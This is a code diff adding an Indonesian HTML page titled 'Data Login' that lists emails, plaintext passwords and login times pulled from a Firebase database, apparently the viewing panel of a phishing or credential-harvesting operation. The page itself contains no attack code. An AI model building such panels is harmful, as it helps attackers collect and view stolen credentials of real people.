@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Info</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Security-Policy"
+        content="default-src 'self'; 
+                 script-src 'self' https://www.gstatic.com; 
+                 style-src 'self' 'unsafe-inline'; 
+                 connect-src https://yanofc-1ecd3-default-rtdb.asia-southeast1.firebasedatabase.app;
+                 img-src 'self' data:;">
+  <link rel="preconnect" href="https://www.gstatic.com">
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js" defer></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js" defer></script>
+  <script src="app.js" defer></script>
+  <style>
+    body { background: #0a0a0a; color: #fff; font-family: 'Poppins', sans-serif; padding: 20px; }
+    h1 { text-align: center; color: #1e90ff; font-weight: 600; }
+    table { width: 100%; border-collapse: collapse; margin-top: 32px; }
+    th, td { padding: 12px; border: 1px solid #333; text-align: center; word-break: break-word; }
+    th { background: #1e90ff; }
+    tr:nth-child(even) { background-color: #151515; }
+    .xss { color: #ff5252; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <h1>Data Login</h1>
+  <table>
+    <thead><tr><th>Email</th><th>Password</th><th>Login Time</th></tr></thead>
+    <tbody id="user-table"></tbody>
+  </table>
+</body>
+</html>
